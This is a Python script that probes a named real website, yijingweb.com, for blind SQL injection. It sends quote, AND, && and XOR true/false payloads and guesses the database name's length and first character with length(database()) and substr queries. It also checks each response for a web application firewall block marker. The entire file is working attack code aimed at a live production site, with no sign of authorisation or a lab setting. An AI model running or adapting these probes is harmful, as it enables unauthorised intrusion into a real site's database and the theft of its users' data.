#!/usr/bin/env python3
"""yijingweb www: find working oracle in CURRENT page version
Try multiple expression styles, measure sizes carefully
"""
import urllib.request, time

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
BASE = "http://www.yijingweb.com/webmall/detail.php"

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        body = r.read()
        blocked = b"\xe4\xba\x91\xe7\xbd\x91\xe7\x9b\xbe" in body
        return r.status, len(body), blocked
    except urllib.error.HTTPError as e:
        return e.code, len(e.read(5000)), False
    except Exception:
        return 0, 0, False

def probe(payload, tag):
    code, sz, blocked = fetch(BASE + "?id=686" + payload)
    print("%-22s code=%s size=%d blocked=%s" % (tag, code, sz, blocked), flush=True)
    time.sleep(2)

print("=== oracle hunt (current version) ===")
probe("", "base")
probe("%27", "quote")
probe("%27%20%26%26%20(select%201)=1--%20", "&&1=1")
probe("%27%20%26%26%20(select%201)=2--%20", "&&1=2")
probe("%27%20aNd%20(select%201)=1--%20", "aNd1=1")
probe("%27%20aNd%20(select%201)=2--%20", "aNd1=2")
probe("%27%20aNd%20(select%20length(database()))=6--%20", "aNd-len6")
probe("%27%20aNd%20(select%20length(database()))=7--%20", "aNd-len7")
probe("%27%20aNd%20(select%20substr(database(),1,1))='h'--%20", "aNd-substr-h")
probe("%27%20aNd%20(select%20substr(database(),1,1))='x'--%20", "aNd-substr-x")
probe("%27%20XOR%20(select%201)=1--%20", "XOR1=1")
probe("%27%20XOR%20(select%201)=2--%20", "XOR1=2")
